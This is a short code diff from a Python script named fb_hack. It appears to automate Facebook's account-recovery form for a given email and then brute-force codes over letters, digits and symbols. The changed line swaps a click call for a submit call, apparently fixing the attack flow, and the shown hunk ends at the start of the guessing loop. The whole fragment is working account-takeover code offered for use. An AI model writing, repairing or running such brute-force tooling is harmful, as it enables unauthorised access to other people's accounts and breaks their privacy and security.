@@ -51,7 +51,7 @@ def fb_hack(email, codex, respect):
   browser.form['email'] = email
   browser.submit()
   browser.select_form(nr=0)
-  browser.click(name="Try another way")
+  browser.submit(name="Try another way")
   counter = 0
   for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","!","#","$","%","^","&","*"], repeat=int(respect)):
     p = (''.join(map(str, combination)))
